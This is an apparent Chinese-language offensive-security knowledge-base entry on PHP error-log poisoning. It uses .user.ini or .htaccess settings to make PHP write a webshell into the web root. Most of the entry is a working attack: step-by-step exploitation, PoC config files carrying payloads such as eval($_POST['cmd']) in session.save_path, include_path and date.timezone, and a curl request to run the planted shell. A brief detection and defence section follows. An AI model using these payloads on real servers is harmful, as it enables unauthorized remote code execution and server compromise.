---
id: web-php-file-inclusion-php-error-log-poisoning-webshell
title: PHP 错误日志投毒将恶意代码写入 Web 目录实现 RCE
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-error-log-poisoning
aliases:
- error_log 写马
- include_path 报错注入
- session.save_path 报错
- html_errors 关闭
- PHP Warning 写 shell
- 日志包含写马
tags:
- php
- error-log
- log-poisoning
- file-inclusion
- user-ini
- htaccess
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:18:57+08:00'
  notes: 已对照原文与 img 08-10 核对：log_errors=On、html_errors=Off 必要性、error_log 指向 Web 目录、include_path 回显 Fatal 会阻断、改用 session.save_path+session.auto_start 的 Warning 写马并成功执行 phpinfo 均一致；mod_php 下 .htaccess 等价写法与 Fatal 阻断说明正确
---

## 一句话结论

当可以写 `.user.ini`（PHP-FPM）或 `.htaccess`（mod_php）且 Web 目录可写时，把 `error_log` 指向 Web 目录下的 `.php` 文件，再把 `<?php ... ?>` 放进会被 PHP 打进 Warning 的配置项（如 `session.save_path`、`include_path`），PHP 就会把恶意代码写进该文件，访问它即可执行。

## 原理

- `log_errors=On` 让 PHP 把运行期 Warning/Fatal error 写入日志；`error_log=/var/www/html/shell.php` 把日志路径改到 Web 根目录。若目标文件不存在而目录可写，PHP 会自动创建它。
- PHP 的报错文本会原样拼接部分配置值。例如包含不存在的文件时，错误为：
  `Failed opening 'x' for inclusion (include_path='<攻击者可控值>')`
  启动 Session 失败时，`session.save_path` 的值也会出现在 Warning 里。把 payload 放进这些配置项，payload 就随报错落进日志文件。
- 日志文件必须以 PHP 代码形式可解析。`html_errors` 默认开启，会把 `<` 转成 `&lt;`，写进去的 `<?php ... ?>` 变成 HTML 实体而无法执行；所以必须同时设置 `html_errors=Off`。
- 触发方式的选择很关键：用 `auto_prepend_file` 指向不存在的文件来触发报错时，该错误本身是 Fatal error，会在脚本执行前终止请求，虽然日志写成了，但后续请求仍会先触发同样的 Fatal，导致 shell 页面无法正常执行。改用 `session.auto_start=1` + 非法 `session.save_path`，Warning 不会杀死进程，请求结束后就能访问已写入的 shell。
- `.user.ini` 只接受 `PHP_INI_PERDIR`/`PHP_INI_ALL` 配置；`log_errors`、`error_log`、`html_errors`、`session.save_path`、`include_path` 都可在该级别设置。`.htaccess` 的 mod_php 写法用 `php_flag`/`php_value`。

## 触发条件

- 可写入 `.user.ini`（PHP-FPM/CGI）或 `.htaccess`（Apache + mod_php），且对应配置项未被 `php_admin_value` 锁定。
- `error_log` 指向的目录对 PHP-FPM/Apache 运行用户可写，且该路径可被 Web 访问。
- 能制造一次包含失败/Session 启动失败等会把可控配置值打印进 Warning 的错误。
- `html_errors` 可被关闭（否则尖括号被转义，写出的不是可执行 PHP）。

## 利用步骤

1. 确认可写配置文件、Web 根目录路径与运行用户权限；先上传一个测试文件确认目录可写。
2. 上传恶意文本文件（如 `1.txt`）作为 payload 来源，或直接把 payload 写进配置项。
3. 写 `.user.ini`：开启错误日志、关闭 HTML 转义、把 `error_log` 指向 Web 目录下不存在的 `shell.php`，并用非法 `session.save_path` 携带 payload、开启自动 Session。
4. 请求任意 PHP 页面，让 PHP 产生 Warning，日志文件被创建并写入 payload。
5. 访问 `/shell.php`，payload 被 PHP 解析执行；若 shell 内容为 `phpinfo()` 或一句话，即可继续利用。

## PoC

`.user.ini`（PHP-FPM）：

```ini
log_errors=On
html_errors=Off
error_log=/var/www/html/shell.php
session.save_path="<?php phpinfo();?>"
session.auto_start=1
```

请求任意 PHP 页面后访问：

```bash
curl -s 'http://target/shell.php'
```

mod_php 的 `.htaccess` 等价写法：

```apache
php_flag log_errors On
php_flag html_errors Off
php_value error_log /var/www/html/shell.php
php_value include_path "<?php eval($_POST[1]); ?>"
php_value auto_prepend_file a_file_that_does_not_exist
```

该写法会写马，但由于 `auto_prepend_file` 的 Fatal error 会持续阻断请求，实际执行 shell 时更稳的是前一种 Session 触发方式。

另一种触发源是 `date.timezone`：把它设成非法值，页面调用 `date()` 等时间函数时产生 Warning，payload 随错误写入日志：

```ini
log_errors=On
html_errors=Off
error_log=/var/www/html/articles/shell.php
date.timezone="<?php eval($_POST['cmd']);?>"
```

## 变体与关联

- 触发源变体：包含不存在的文件（`include_path` 回显）、Session 启动失败（`session.save_path` 回显）、非法时区（`date.timezone` 回显）。
- 日志文件位置变体：写入 Web 目录直接访问执行；或写入非 Web 目录后配合已有 LFI/文件包含执行。
- 与 `.user.ini` 的 `auto_prepend_file` 组合：日志文件本身可被自动前置包含，省去直接访问。
- 关联：[[web-php-file-inclusion-user-ini-auto-prepend-rce]]（可直接上传 payload 文件时的更短路径）；[[web-php-file-inclusion-user-ini-session-save-path-webshell]]（Session 文件落 Web 目录）。
- 边界：`error_log` 目录不可写、`html_errors` 被 `php_admin_value` 锁定、`session.auto_start=1` 被禁用、或日志路径不可 Web 访问时，需要换触发源或结合 LFI。

## 检测与防御

- 检测：`error_log` 指向 Web 根目录；Web 目录出现内容包含 `PHP Warning`/`PHP Fatal error` 的 `.php` 文件；`.user.ini` 中出现 `session.save_path`、`date.timezone`、`include_path` 等携带尖括号的值。
- 防御：`php_admin_value` 锁定 `error_log`、`html_errors`、`session.save_path`；关闭 `.user.ini`（`user_ini.filename=""`）；Web 目录对 PHP-FPM 用户只读；日志统一写到 Web 根之外并限制权限；上传与落盘内容检测 `<?`、`PHP Warning` 等特征。
